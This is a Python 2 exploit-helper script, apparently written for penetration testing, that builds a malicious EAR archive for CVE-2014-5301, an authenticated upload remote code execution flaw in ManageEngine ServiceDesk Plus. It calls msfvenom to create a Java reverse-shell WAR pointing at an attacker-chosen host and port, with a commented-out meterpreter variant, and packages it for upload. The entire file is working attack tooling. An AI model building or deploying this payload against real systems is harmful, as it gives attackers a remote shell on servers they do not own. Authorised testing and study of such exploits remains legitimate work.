#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
# build_ear.py - nighter                                                                                    #
#                                                                                                           #
# DATE                                                                                                      #
# 13/02/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Build ear payload for CVE_2014-5301 manageendine_servicedesk_plus                                         #
# authenticated upload remote code execution.                                                               #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################
import os
import sys
import string
import random
import shutil


def random_string_generator(size=8, chars=string.ascii_lowercase + string.ascii_uppercase):
    return ''.join(random.choice(chars) for _ in range(size))


def build_ear():

    ear_app_base = random_string_generator()
    current_dir = os.getcwd()

    try:
        os.makedirs('/tmp/%s' % ear_app_base)
        os.makedirs('/tmp/%s/META-INF' % ear_app_base)
    except:
        pass

    os.chdir('/tmp/%s' % ear_app_base)
    #payload = 'msfvenom -a x86 -p java/meterpreter/reverse_tcp lhost=%s lport=%s -f war -o %s.war' % (LHOST, LPORT, ear_app_base)
    payload = 'msfvenom -a x86 -p java/shell/reverse_tcp lhost=%s lport=%s -f war -o %s.war' % (LHOST, LPORT, ear_app_base)
    os.system(payload)

    app_xml = '<?xml version=\"1.0\" encoding=\"UTF-8\"?>'
    app_xml += '<application>'
    app_xml += '<display-name>%s</display-name>' % ear_app_base
    app_xml += '<module><web><web-uri>%s.war</web-uri>' % ear_app_base
    app_xml += "<context-root>/%s</context-root></web></module></application>" % ear_app_base

    with open('/tmp/%s/META-INF/application.xml' % ear_app_base, 'w') as f:
        f.write(app_xml)

    # Zipfile
    os.chdir(current_dir)
    shutil.make_archive(ear_app_base, 'zip', '/tmp/%s' % ear_app_base)
    os.rename(ear_app_base + '.zip', ear_app_base + '.ear')

    # cleanup
    if len(ear_app_base) == 0:
        return
    os.system('rm -rf /tmp/%s' % ear_app_base)


if __name__ == '__main__':

    if len(sys.argv) != 3:
        print("""
Build ear payload for CVE_2014-5301 manageendine_servicedesk_plus
authenticated upload remote code execution.
[nighter@nighter.se]
    """)
        print("Usage: %s <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./build_ear.py 10.11.0.xxx 4444\n")
        sys.exit(0)

    LHOST = sys.argv[1]
    LPORT = sys.argv[2]

    build_ear()
